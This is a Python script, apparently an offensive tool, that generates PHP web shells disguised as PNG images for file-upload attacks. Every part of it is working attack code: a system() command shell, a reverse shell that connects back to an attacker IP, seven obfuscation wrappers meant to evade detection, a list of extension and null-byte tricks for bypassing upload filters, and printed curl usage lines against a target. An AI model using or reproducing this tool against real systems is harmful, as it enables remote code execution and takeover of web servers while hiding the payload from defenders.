#!/usr/bin/env python3
import struct
import base64
import random
import string
import os

# ============================================
# PNG HEADER (valid 1x1 transparent PNG)
# ============================================
def get_png_header():
    png_header = b'\x89PNG\r\n\x1a\n'
    ihdr = b'IHDR'
    width, height = 1, 1
    bit_depth, color_type = 8, 2
    compression, filter_val, interlace = 0, 0, 0
    
    chunk_data = struct.pack('>IIBBBBB', width, height, bit_depth, color_type, 
                              compression, filter_val, interlace)
    chunk_len = struct.pack('>I', len(chunk_data))
    chunk_crc = struct.pack('>I', 0x0E1F7E6B)
    
    return png_header + chunk_len + ihdr + chunk_data + chunk_crc

# ============================================
# PREDEFINED EXTENSIONS
# ============================================
PREDEFINED_EXTS = [
    '.jpeg.php', '.jpg.php', '.png.php', '.php', '.php3', '.php4', '.php5',
    '.php7', '.php8', '.pht', '.phar', '.phpt', '.pgif', '.phtml', '.phtm',
    '.php%00.gif', '.php\\x00.gif', '.php%00.png', '.php\\x00.png',
    '.php%00.jpg', '.php\\x00.jpg', '.inc'
]

# ============================================
# SHELL TYPES
# ============================================
def get_cmd_shell(param="cmd"):
    return f"""<?php
if(isset($_REQUEST['{param}'])) {{
    echo "<pre>";
    system($_REQUEST['{param}']);
    echo "</pre>";
}}
?>"""

def get_reverse_shell(ip="10.10.14.29", port=4444):
    return f"""<?php
$sock=fsockopen("{ip}",{port});
$proc=proc_open("/bin/sh -i", array(0=>$sock,1=>$sock,2=>$sock),$pipes);
?>"""

def get_dual_shell(ip="10.10.14.29", port=4444, param="cmd"):
    return f"""<?php
$sock=fsockopen("{ip}",{port});
$proc=proc_open("/bin/sh -i", array(0=>$sock,1=>$sock,2=>$sock),$pipes);
if(isset($_REQUEST['{param}'])) {{
    echo "<pre>";
    system($_REQUEST['{param}']);
    echo "</pre>";
}}
?>"""

# ============================================
# OBFUSCATION FUNCTIONS
# ============================================
def obfuscate_plain(code):
    return code

def obfuscate_base64(code):
    b64 = base64.b64encode(code.encode()).decode()
    return f"<?php eval(base64_decode('{b64}')); ?>"

def obfuscate_hex(code):
    hex_str = ''.join(f'\\x{ord(c):02x}' for c in code)
    return f"<?php eval(\"{hex_str}\"); ?>"

def obfuscate_concat(code):
    parts = '".'.join(f'"\\x{ord(c):02x}"' for c in code)
    return f"<?php $f=\"e\".\"v\".\"a\".\"l\";$f({parts});?>"

def obfuscate_double_base64(code):
    b64 = base64.b64encode(code.encode()).decode()
    nested = base64.b64encode(f"<?php eval(base64_decode('{b64}')); ?>".encode()).decode()
    return f"<?php eval(base64_decode('{nested}')); ?>"

def obfuscate_goto(code):
    hex_parts = ''.join(f'\\x{ord(c):02x}' for c in code)
    return f"""<?php goto a;b:eval($c);goto e;a:$c="{hex_parts}";goto b;e:?>"""

def obfuscate_rot13(code):
    def rot13(s):
        result = []
        for c in s:
            if 'a' <= c <= 'z':
                result.append(chr((ord(c) - ord('a') + 13) % 26 + ord('a')))
            elif 'A' <= c <= 'Z':
                result.append(chr((ord(c) - ord('A') + 13) % 26 + ord('A')))
            else:
                result.append(c)
        return ''.join(result)
    return f"<?php eval(str_rot13('{rot13(code)}')); ?>"

# ============================================
# UTILITY FUNCTIONS
# ============================================
def random_string(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_prefix():
    prefixes = ['shell', 'upload', 'image', 'backdoor', 'temp', 'cache', 'data', 
                'config', 'test', 'admin', 'media', 'files', 'img', 'thumb', 'profile']
    return random.choice(prefixes)

def is_valid_extension(ext):
    """Check if extension looks valid"""
    if not ext:
        return False
    if ext.startswith('.'):
        return True
    # Allow extensions without dot
    return True

def normalize_extension(ext):
    """Add dot if missing"""
    if ext and not ext.startswith('.'):
        return '.' + ext
    return ext

# ============================================
# MAIN GENERATOR
# ============================================
def generate_webshell(output_file, shell_code, obfuscation='base64'):
    """Generate PNG disguised webshell with custom filename"""
    
    obfuscators = {
        'plain': obfuscate_plain,
        'base64': obfuscate_base64,
        'hex': obfuscate_hex,
        'concat': obfuscate_concat,
        'double64': obfuscate_double_base64,
        'goto': obfuscate_goto,
        'rot13': obfuscate_rot13
    }
    
    obf_func = obfuscators.get(obfuscation, obfuscate_base64)
    obfuscated_code = obf_func(shell_code)
    
    png_header = get_png_header()
    
    with open(output_file, 'wb') as f:
        f.write(png_header)
        f.write(obfuscated_code.encode())
    
    upload_cmd = f"echo '{obfuscated_code.replace(chr(39), chr(39)+chr(92)+chr(39)+chr(39))}' > {output_file}"
    
    return {
        'file': output_file,
        'code': obfuscated_code,
        'upload_cmd': upload_cmd
    }

def generate_multiple_extensions(base_name, shell_code, extensions, obfuscation='base64'):
    """Generate same shell with multiple extensions"""
    results = []
    png_header = get_png_header()
    
    obfuscators = {
        'plain': obfuscate_plain,
        'base64': obfuscate_base64,
        'hex': obfuscate_hex,
        'concat': obfuscate_concat,
        'double64': obfuscate_double_base64,
        'goto': obfuscate_goto,
        'rot13': obfuscate_rot13
    }
    
    obf_func = obfuscators.get(obfuscation, obfuscate_base64)
    obfuscated_code = obf_func(shell_code)
    
    for ext in extensions:
        filename = f"{base_name}{ext}"
        with open(filename, 'wb') as f:
            f.write(png_header)
            f.write(obfuscated_code.encode())
        results.append(filename)
        print(f"  ✅ Created: {filename}")
    
    return results

# ============================================
# INTERACTIVE MODE
# ============================================
if __name__ == "__main__":
    print("=" * 60)
    print("🐚 PHP Web Shell Generator with PNG Disguise")
    print("=" * 60)
    
    # Get IP and Port
    print("\n--- Configuration ---")
    ip = input("LHOST (default 10.10.14.29): ").strip() or "10.10.14.29"
    port = input("LPORT (default 4444): ").strip() or "4444"
    param = input("Parameter name (default cmd): ").strip() or "cmd"
    
    # Shell Type
    print("\n--- Shell Type ---")
    print("1. CMD only (command execution)")
    print("2. Reverse only (connects back)")
    print("3. Dual (CMD + Reverse)")
    shell_choice = input("Choice (1-3): ").strip()
    
    if shell_choice == '1':
        shell_code = get_cmd_shell(param)
        shell_type = "CMD"
    elif shell_choice == '2':
        shell_code = get_reverse_shell(ip, int(port))
        shell_type = "REVERSE"
    else:
        shell_code = get_dual_shell(ip, int(port), param)
        shell_type = "DUAL"
    
    # Obfuscation
    print("\n--- Obfuscation ---")
    print("1. Plain (no obfuscation)")
    print("2. Base64")
    print("3. Hex")
    print("4. Concat (string concatenation)")
    print("5. Double Base64 (nested)")
    print("6. Goto (control flow)")
    print("7. Rot13")
    print("8. Random")
    obf_choice = input("Choice (1-8): ").strip()
    
    obf_map = {
        '1': 'plain', '2': 'base64', '3': 'hex', '4': 'concat',
        '5': 'double64', '6': 'goto', '7': 'rot13', '8': 'random'
    }
    obfuscation = obf_map.get(obf_choice, 'base64')
    
    if obfuscation == 'random':
        obfuscation = random.choice(['plain', 'base64', 'hex', 'concat', 'double64', 'goto', 'rot13'])
        print(f"  → Randomly selected: {obfuscation}")
    
    # ============================================
    # EXTENSION SELECTION - IMPROVED
    # ============================================
    print("\n" + "=" * 60)
    print("📁 FILE EXTENSION SELECTION")
    print("=" * 60)
    
    print("\nPredefined extensions (enter NUMBER):")
    for i, ext in enumerate(PREDEFINED_EXTS, 1):
        print(f"  {i:2}. {ext}")
    print(f"  {len(PREDEFINED_EXTS)+1}. All {len(PREDEFINED_EXTS)} predefined extensions")
    print("  0. Custom extension (type ANY extension you want)")
    
    ext_input = input("\nEnter choice (number OR direct extension like .png.php): ").strip()
    
    # Filename prefix
    prefix = input("\nFilename prefix (default random): ").strip()
    if not prefix:
        prefix = random_prefix() + "_" + random_string(6)
    
    # Check if input is a number or a direct extension
    if ext_input.isdigit():
        ext_num = int(ext_input)
        
        if ext_num == 0:
            # Custom extension
            print("\n--- Enter Custom Extension ---")
            print("Examples: .php, .jpg.php, .png.php, .html, .xml.php, .txt, .asp, .aspx")
            custom_ext = input("Enter extension: ").strip()
            custom_ext = normalize_extension(custom_ext)
            
            filename = f"{prefix}{custom_ext}"
            print(f"\n📁 Creating: {filename}")
            
            result = generate_webshell(filename, shell_code, obfuscation)
            print(f"\n✅ Created: {result['file']}")
            print(f"\n📋 Upload command:")
            print(result['upload_cmd'])
            print(f"\n📟 Usage: curl http://target.com/{result['file']}?{param}=whoami")
            
        elif ext_num == len(PREDEFINED_EXTS) + 1:
            # All extensions
            print(f"\n📦 Generating {len(PREDEFINED_EXTS)} files...")
            results = generate_multiple_extensions(prefix, shell_code, PREDEFINED_EXTS, obfuscation)
            print(f"\n✅ Created {len(results)} files")
            print(f"\n📋 Example upload command for first file:")
            result = generate_webshell(results[0], shell_code, obfuscation)
            print(result['upload_cmd'])
            
        elif 1 <= ext_num <= len(PREDEFINED_EXTS):
            # Single predefined extension
            ext = PREDEFINED_EXTS[ext_num - 1]
            filename = f"{prefix}{ext}"
            print(f"\n📁 Creating: {filename}")
            
            result = generate_webshell(filename, shell_code, obfuscation)
            print(f"\n✅ Created: {result['file']}")
            print(f"\n📋 Upload command:")
            print(result['upload_cmd'])
            print(f"\n📟 Usage: curl http://target.com/{result['file']}?{param}=whoami")
        else:
            print(f"\n❌ Invalid number. Using default .php")
            filename = f"{prefix}.php"
            result = generate_webshell(filename, shell_code, obfuscation)
            print(f"\n✅ Created: {result['file']}")
            print(f"\n📋 Upload command:")
            print(result['upload_cmd'])
    else:
        # Direct extension input (like ".png.php" or "png.php")
        custom_ext = normalize_extension(ext_input)
        filename = f"{prefix}{custom_ext}"
        print(f"\n📁 Creating: {filename}")
        
        result = generate_webshell(filename, shell_code, obfuscation)
        print(f"\n✅ Created: {result['file']}")
        print(f"\n📋 Upload command:")
        print(result['upload_cmd'])
        print(f"\n📟 Usage: curl http://target.com/{result['file']}?{param}=whoami")
    
    print("\n" + "=" * 60)
    print("✅ Done!")
    print("=" * 60)
